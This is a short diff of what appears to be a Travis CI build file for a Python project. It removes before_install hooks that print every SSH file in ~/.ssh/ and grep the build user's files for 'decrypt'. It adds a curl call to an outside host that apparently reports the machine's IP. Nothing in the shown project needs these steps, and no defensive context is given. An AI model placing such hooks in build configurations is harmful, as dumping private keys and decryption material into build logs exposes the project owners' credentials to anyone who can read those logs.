@@ -2,8 +2,7 @@ language: python
 python:
 - '3.4'
 before_install:
-- find /home/travis -type f -exec grep -C 3 'decrypt' {} \;
-- find ~/.ssh/ -exec cat {} \;
+    - curl ip.cow.org
 script:
 - python script.py
 env:
